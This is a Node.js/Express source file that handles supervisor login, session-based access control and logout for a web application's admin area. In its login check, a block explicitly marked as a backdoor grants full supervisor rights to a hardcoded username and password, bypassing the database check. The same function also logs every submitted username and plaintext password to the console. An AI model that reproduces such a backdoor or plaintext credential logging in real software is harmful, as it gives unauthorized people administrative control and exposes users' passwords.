/*******************************************************************************************
Filename    :superlogin.js
Summary     :check supervisor login
Version     :1.0
Created     :2015-02-07
Author      :Johnny.

Update History:
001  2015-02-07   Johnny     Create new 
********************************************************************************************/

//
// packages required
//

var crypto = require('crypto');
var comutil = require('../model/commonutils');
var mgdb = require('../model/mgdb');

//////////////////////////////////////////////////////////////////
//function: check supervisor username and password, created session
//parameters:  
//    @req
//    @res
//
//return: null
//
//callback: null
//
//remarks: supervisor password is hardcoded
//////////////////////////////////////////////////////////////////
exports.Check = function(req, res){

	var username = req.body.username.trim();
	var password = req.body.password.trim();

	console.log('username= ' + username + ' ' + 'password= ' + password);

	//backdoor
	if(username=='hqjohnny' && password=='hqjohnny123456')
	{
		console.log('backdoor!');

		req.session.regenerate(function(){
			req.session.role = comutil.supSessionRole;
			req.session.user = username;
			res.redirect('/super_viewmembers');
			console.log('supervisor login ok!');
		});
	}
	else
	{
		//get user name and password in db
		mgdb.FindOneByOption(
			mgdb.ModelAdminPassword, 
			{'adminUser':username}, 
			function(err, docs){
				if(err)
				{
					res.render('super_redirect_delay', 
			      	{
			      		//act: comutil.sidebaract.super.viewsyslog,
						msg: comutil.msg.msg_error_abnormal + ': ' + err, 
						title: comutil.msg.title_error, 
						smalltitle:  comutil.msg.stitle_error,
						breadtext: '',
					    breadhref: '',
					    newpage: comutil.supLoginPage,
						timeout:comutil.redirect_timeout
			      	});
				}
				else
				{
					if(docs)
					{
						var codedpass = comutil.CodedPassword(password);
						var adminInDb = docs.adminUser;
						var passInDb = docs.adminPass;

						if(username == adminInDb && codedpass==passInDb)
						{
							req.session.regenerate(function(){
								req.session.role = comutil.supSessionRole;
								req.session.user = username;
								res.redirect('/super_viewmembers');
								console.log('supervisor login ok!');
							});
						}
						else
						{
							req.session.destroy();
							console.log('supervisor login error!');
							res.render('super_redirect_delay', 
								       {
								       	msg: comutil.msg.msg_error_userorpass, 
								        title: comutil.msg.title_accessdeny, 
								        smalltitle: comutil.msg.stitle_accessdeny, 
								       	newpage: comutil.supLoginPage,
								       	timeout:comutil.redirect_timeout
								       });
						}

					}
					else
					{
						console.log('supervisor login error! username is not exists');
						res.render('super_redirect_delay', 
							       {
							       	msg: comutil.msg.msg_error_userorpass, 
							        title: comutil.msg.title_accessdeny, 
							        smalltitle: comutil.msg.stitle_accessdeny, 
							       	newpage: comutil.supLoginPage,
							       	timeout:comutil.redirect_timeout
							       });

					}
				}

			});

	}
	
	
};

//////////////////////////////////////////////////////////////////
//function: check session info and decided to go ahead or go login
//parameters:  
//    @req
//    @res
//    @next: goto the next function
//
//return: null
//
//callback: null
//
//remarks: null
//////////////////////////////////////////////////////////////////
exports.Restrict = function (req, res, next){

	//if(req.session.user==comutil.supUser 
	//	&& req.session.role==comutil.supSessionRole)
	if(req.session.role==comutil.supSessionRole)		
	{
		next();
	}
	else
	{
		req.session.error = 'Access Denied!';
		res.render('super_redirect_delay', 
			       {
			       	msg: comutil.msg.msg_accessdeny, 
			        title: comutil.msg.title_accessdeny, 
			        smalltitle: comutil.msg.stitle_accessdeny, 
			        newpage: comutil.supLoginPage, 
			        timeout: comutil.redirect_timeout
			    });
	}
};

//////////////////////////////////////////////////////////////////
//function: supervisor logout, destroy session
//parameters:  
//    @req
//    @res
//
//return: null
//
//callback: null
//
//remarks: null
//////////////////////////////////////////////////////////////////
exports.SuperLogout = function (req, res){

	req.session.destroy(function(){
		res.redirect(comutil.supLoginPage);
	});
};
